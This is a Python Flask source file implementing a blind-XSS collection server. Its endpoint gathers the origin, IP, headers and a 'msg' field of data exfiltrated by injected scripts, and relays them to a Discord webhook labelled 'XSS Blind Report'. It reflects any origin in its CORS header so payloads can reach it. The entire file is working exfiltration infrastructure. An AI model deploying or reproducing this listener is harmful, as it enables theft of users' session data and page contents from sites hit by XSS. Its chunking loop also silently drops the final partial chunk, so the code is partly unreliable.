from flask import Flask, request
import requests
import flask
import urllib
import time
app = Flask(__name__)


@app.route('/reqBXX', methods=['GET', 'POST'])
def send_request():
    # Extract HTTP parts of the request
    http_method = request.method
    http_url = request.url
    http_headers = request.headers
    http_data = urllib.parse.unquote_plus(str(request.get_data()))

    req_msg_param_value = 'null' if request.form.get('msg') == None else str(request.form.get('msg'))
    origin_of_req = 'null' if request.environ.get('HTTP_ORIGIN', 'default value') == None else str(request.environ.get('HTTP_ORIGIN', 'default value'))
    # Send HTTP parts to Discord webhook
    webhook_url = "__BXX_DISCORD__"
    webhook_data = {}

    message_embeds = [{ "description":f"Request send from:\n Origin: {origin_of_req}\n\n \
                              Sender ip address:\n{request.headers.getlist('X-Forwarded-For')[0]}\n\n \
                              -------------------------------------------------------------------------\n\
                             ```Method: {http_method} \nURL: {http_url} \n\nHeaders:\n{http_headers}\n\n```", \
                             "title":"XSS Blind Report", \
                             }]
    webhook_data["embeds"] = message_embeds
    requests.post(webhook_url, json = webhook_data)
    i = 0
    split_size=1500
    for i in range(0,len(req_msg_param_value)//split_size):
        webhook_data = {}
        message_embeds = [{"description":"msg{}:\n {}".format(i+1,req_msg_param_value[i*split_size:(i+1)*split_size])\
        }]
        webhook_data["embeds"] = message_embeds
        requests.post(webhook_url, json = webhook_data)
        # Set Access-Control-Allow-Origin header to allow all origins
        time.sleep(0.2)
    response_headers = {
        'Access-Control-Allow-Origin': '*'
    }
    response = f"OK\n"
    resp = flask.Response(response)
    resp.headers['Access-Control-Allow-Origin'] = request.environ.get('HTTP_ORIGIN', 'default value')
    return resp

if __name__ == '__main__':
    app.run(debug=True)
